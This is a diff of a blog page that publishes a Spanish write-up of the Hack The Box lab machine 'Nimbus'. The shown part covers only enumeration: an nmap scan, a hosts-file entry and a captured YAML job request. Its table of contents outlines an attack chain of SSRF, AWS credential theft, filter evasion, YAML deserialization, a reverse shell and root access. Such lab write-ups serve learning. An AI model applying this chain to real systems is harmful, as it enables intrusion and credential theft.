@@ -3,7 +3,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Nimbus, máquina Hard de Hack The Box (Linux). El write-up se publicará cuando la máquina se retire.">
+        <meta name="description" content="Write-up de Nimbus, máquina Hard de Hack The Box (Linux): enumeración, explotación y escalada de privilegios paso a paso.">
       
       
         <meta name="author" content="D4vKry">
@@ -68,13 +68,13 @@
   <meta property="og:site_name" content="D4vKry">
   <meta property="og:locale" content="es_ES">
   <meta property="og:title" content="Nimbus · D4vKry">
-  <meta property="og:description" content="Nimbus, máquina Hard de Hack The Box (Linux). El write-up se publicará cuando la máquina se retire.">
+  <meta property="og:description" content="Write-up de Nimbus, máquina Hard de Hack The Box (Linux): enumeración, explotación y escalada de privilegios paso a paso.">
   <meta property="og:url" content="https://d4vkry.github.io/HTB/Hard/Nimbus/">
-  <meta property="og:image" content="https://d4vkry.github.io/assets/images/social.png">
+  <meta property="og:image" content="https://d4vkry.github.io/HTB/Hard/Nimbus/Pasted%20image%2020260625225333.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Nimbus · D4vKry">
-  <meta name="twitter:description" content="Nimbus, máquina Hard de Hack The Box (Linux). El write-up se publicará cuando la máquina se retire.">
-  <meta name="twitter:image" content="https://d4vkry.github.io/assets/images/social.png">
+  <meta name="twitter:description" content="Write-up de Nimbus, máquina Hard de Hack The Box (Linux): enumeración, explotación y escalada de privilegios paso a paso.">
+  <meta name="twitter:image" content="https://d4vkry.github.io/HTB/Hard/Nimbus/Pasted%20image%2020260625225333.png">
   
 
   <link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
@@ -730,11 +730,31 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"></path></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Nimbus
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"></path></svg>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"></path></svg>
   
   <span class="md-ellipsis">
     
@@ -748,6 +768,291 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#1-enumeracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Enumeración
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Enumeración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NMAP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pagina-web-principal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Página web principal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion-de-la-pagina-web" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeración de la página web
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-del-formulario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analisis del formulario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descubrimiento-de-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descubrimiento de SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraccion-de-credenciales-aws" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extracción de Credenciales AWS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evasion-por-codificacion-decimal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evasión por Codificación Decimal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#acceso-limitado-a-aws-y-cambio-de-estrategia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso Limitado a AWS y Cambio de Estrategia
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-deserializacion-insegura-en-el-procesador-yaml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Análisis de Deserialización Insegura en el Procesador YAML
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#interceptacion-del-flujo-mediante-aws-sqs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Interceptación del Flujo mediante AWS SQS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-acceso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Acceso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Acceso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#explotacion-de-la-cola-y-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Explotación de la Cola y Reverse Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-enumeracion-interna-del-contenedor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeración interna del contenedor
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Enumeración interna del contenedor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion-de-ficheros" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeración de ficheros
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#funcionamiento-de-workerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Funcionamiento de worker.py
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#revision-de-etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Revisión de /etc/hosts
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-movimiento-lateral-y-elevacion-a-codebuild" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Movimiento Lateral y Elevación a CodeBuild
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Movimiento Lateral y Elevación a CodeBuild">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#evasion-de-restricciones" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evasión de restricciones
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automatizacion-del-exploit-mediante-python-con-boto3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automatización del exploit mediante Python con boto3
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag-de-root-antes-de-conseguir-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag de root antes de conseguir root
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conseguir-acceso-a-root-por-llave-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conseguir acceso a Root por llave SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -789,6 +1094,280 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#1-enumeracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Enumeración
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Enumeración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NMAP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pagina-web-principal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Página web principal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion-de-la-pagina-web" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeración de la página web
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-del-formulario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analisis del formulario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descubrimiento-de-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descubrimiento de SSRF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extraccion-de-credenciales-aws" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extracción de Credenciales AWS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evasion-por-codificacion-decimal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evasión por Codificación Decimal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#acceso-limitado-a-aws-y-cambio-de-estrategia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Acceso Limitado a AWS y Cambio de Estrategia
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#analisis-de-deserializacion-insegura-en-el-procesador-yaml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Análisis de Deserialización Insegura en el Procesador YAML
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#interceptacion-del-flujo-mediante-aws-sqs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Interceptación del Flujo mediante AWS SQS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-acceso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Acceso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Acceso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#explotacion-de-la-cola-y-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Explotación de la Cola y Reverse Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-enumeracion-interna-del-contenedor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeración interna del contenedor
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Enumeración interna del contenedor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#enumeracion-de-ficheros" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeración de ficheros
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#funcionamiento-de-workerpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Funcionamiento de worker.py
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#revision-de-etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Revisión de /etc/hosts
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-movimiento-lateral-y-elevacion-a-codebuild" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Movimiento Lateral y Elevación a CodeBuild
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Movimiento Lateral y Elevación a CodeBuild">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#evasion-de-restricciones" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evasión de restricciones
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#automatizacion-del-exploit-mediante-python-con-boto3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automatización del exploit mediante Python con boto3
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag-de-root-antes-de-conseguir-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag de root antes de conseguir root
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conseguir-acceso-a-root-por-llave-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conseguir acceso a Root por llave SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -816,24 +1395,563 @@
       Linux
     </span>
     
-      <span class="dk-badge dk-badge--active">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"></path></svg> Activa
-      </span>
-    
   </div>
   <dl class="dk-machine__meta">
     
-    <div><dt>Fecha</dt><dd>25/06/2026</dd></div>
+    <div><dt>Fecha</dt><dd>22/06/2026</dd></div>
     
   </dl>
 </div>
 
 <h1 id="nimbus">Nimbus<a class="headerlink" href="#nimbus" title="Permanent link">¶</a></h1>
-<div class="admonition warning">
-<p class="admonition-title">Máquina activa</p>
-<p>Para respetar las normas de <strong>Hack The Box</strong>, no publico soluciones de máquinas que aún están activas en la plataforma.</p>
-<p>El write-up completo ya está documentado en mi bóveda privada y se publicará en esta misma URL el día que la máquina pase a estado <strong>Retired</strong>.</p>
-</div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260625225333.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260625225333.png"></a></p>
+<h2 id="1-enumeracion">1. Enumeración<a class="headerlink" href="#1-enumeracion" title="Permanent link">¶</a></h2>
+<h3 id="nmap">NMAP<a class="headerlink" href="#nmap" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.99<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-06-22<span class="w"> </span><span class="m">14</span>:06<span class="w"> </span>+0000
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.245.218
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.11s<span class="w"> </span>latency<span class="o">)</span>.
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65533</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">9</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu13.16<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.24.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.24.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>http://nimbus.htb/
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">31</span>.83<span class="w"> </span>seconds
+</code></pre></div>
+<p>Vemos 2 puertos abiertos:
+- 22 SSH: Puerto que usaremos seguramente después de conseguir credenciales sobre un usuario o una llave ssh
+- 80 HTTP: Página web, seguramente nuestro punto de entrada.</p>
+<p>Antes de entrar a la página vemos como en el nmap redirige a <strong>nimbus.htb</strong>, por lo que lo meteremos dentro de nuestro fichero "/etc/hosts" para que pueda resolver el nombre a la ip:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>tail<span class="w"> </span>-1<span class="w"> </span>/etc/hosts<span class="w">         </span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="m">10</span>.129.245.218<span class="w">  </span>nimbus.htb
+</code></pre></div>
+<h3 id="pagina-web-principal">Página web principal<a class="headerlink" href="#pagina-web-principal" title="Permanent link">¶</a></h3>
+<p>Entramos por navegador a la página web, vemos de que va y vemos tecnologías con la extensión Wappalyzer:
+<a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260622161030.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260622161030.png"></a></p>
+<p>Vemos solamente 2 tecnologías:
+- Nginx v.1.24.0
+- SO: Ubuntu</p>
+<p>Leyendo lo poco que nos ofrece a simple vista, parece un control interno de una herramienta llamada Nimbus (como la máquina), que se usa por el equipo de ingeniería que hay detrás (Numbus Labs) para gestionar tareas en segundo plano, como copias de seguridad, generar informes, programar tareas...</p>
+<p>Mencionan que si un ingeniero necesita acceder directamente (por ssh), necesita la aprobación del equipo de DevOps y tiene que contactar a un compañero llamado "Marcus" por Slack que autorice su clave de seguridad.</p>
+<h3 id="enumeracion-de-la-pagina-web">Enumeración de la página web<a class="headerlink" href="#enumeracion-de-la-pagina-web" title="Permanent link">¶</a></h3>
+<p>Abajo de todo nos pone la versión del software: <strong>nimbus v1.4.2</strong>, mas adelante buscaremos sobre esta versión por si existe alguna vulnerabilidad.</p>
+<p>Vemos 2 botones, uno que pone "Submit Job" y otro que es "Sign In" para iniciar sesión.</p>
+<p>Accediendo primero a sing in nos aparece una página que nos avisa que está temporalmente deshabilitado, ya que al parecer están mudando sus sistemas de Single Sign-On (SSO) hacia Okta, que es una plataforma de gestión de identidades. Si marcan esto es que seguramente haya algún subdominio involucrado que enumeraremos mas adelante.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260622162013.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260622162013.png"></a></p>
+<p>El botón de submit job es la interfaz donde los ingenieros ordenan al sistema qué tarea ejecutar.</p>
+<p>Esta parte de la web acepta formato YAML para crear una nueva tarea, aparecen ejemplos abajo:</p>
+<p></p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Example:
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>name: nightly-db-backup
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>schedule: "0 2 * * *"
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>runtime: python3.11
+</code></pre></div>
+<a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="Pasted%20image%2020260622162232.png" data-desc-position="bottom"><img alt="" src="Pasted%20image%2020260622162232.png"></a><p></p>
+<h3 id="analisis-del-formulario">Analisis del formulario<a class="headerlink" href="#analisis-del-formulario" title="Permanent link">¶</a></h3>
+<p>Nos centraremos ne la funcionalidad de enviar tareas en YAML, por lo que primero interceptaremos la petición con Caido al enviar una prueba para ver como se comprueba el backend:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nt">schedule</span><span class="p">:</span><span class="w"> </span><span class="s">"0</span><span class="nv"> </span><span class="s">2</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">*"</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nt">runtime</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python3.11</span>
+</code></pre></div>
+<p>Aqui capturamos toda la petición POST:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nf">POST</span> <span class="nn">/jobs/preview</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">nimbus.htb</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">82</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">http://nimbus.htb</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">http://nimbus.htb/jobs</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="na">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="nt">yaml_body</span><span class="o">=</span><span class="s">name%3A+test%0D%0Aschedule%3A+%220+2+*+*+*%22%0D%0Aruntime%3A+python3.11</span>
+</code></pre></div>
+<p>Si observamos el comportamiento al procesar el YAML, queremos comprobar si el backend es capaz de realizar peticiones en nuestro nombre.</p>
